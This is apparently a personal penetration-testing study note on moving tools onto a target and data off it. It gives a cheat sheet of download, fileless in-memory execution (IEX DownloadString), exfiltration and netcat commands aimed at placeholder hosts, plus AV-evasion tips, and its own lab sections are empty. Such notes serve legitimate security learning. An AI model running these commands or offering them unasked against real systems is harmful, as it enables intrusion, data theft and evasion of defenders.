# File Transfers

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Move tools onto a target and loot off it, using whatever's available (and sometimes evading detection).

## Windows (download / exec / upload)
```powershell
Invoke-WebRequest http://<ip>/tool.ps1 -OutFile tool.ps1
IEX (New-Object Net.WebClient).DownloadString('http://<ip>/x.ps1')   # run in memory, no disk
Invoke-WebRequest -Uri http://<ip>/upload -Method POST -Body $b64    # exfil (base64 the file first)
# native LOLBins:
certutil.exe -urlcache -split -f http://<ip>/nc.exe nc.exe
bitsadmin /transfer j http://<ip>/nc.exe C:\Temp\nc.exe
```

## Linux
```bash
wget http://<ip>/linpeas.sh -O /tmp/x.sh ; curl http://<ip>/x.sh -o /tmp/x.sh
python3 -c "import urllib.request;urllib.request.urlretrieve('http://<ip>/f','f')"
php -r 'file_put_contents("f",file_get_contents("http://<ip>/f"));'
```

## Protocol-based (both)
```bash
scp user@<ip>:/tmp/file .            # over SSH
nc -lvnp 4444 > out ; nc <ip> 4444 < file    # netcat
smbclient //<ip>/share -U user       # then get/put  (impacket smbserver.py to host)
tftp -i <ip> GET nc.exe
```
Host a quick server: `python3 -m http.server 80` / `impacket-smbserver share .` / `php -S 0.0.0.0:80`.

## Evasion tips
Alternate ports, legit User-Agents, base64/`certutil -encode`, compress+encrypt (`7z a -p -mhe`), Windows alternate data streams (`type nc.exe > f.txt:nc.exe`).

> `python3 -m http.server` on your box + `wget`/`certutil`/IWR on the target covers 90% of transfers. `IEX (...).DownloadString` is the fileless favorite — runs in memory, nothing hits disk for AV to scan.

## My notes / lab output
Filled in as I run these on lab targets.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
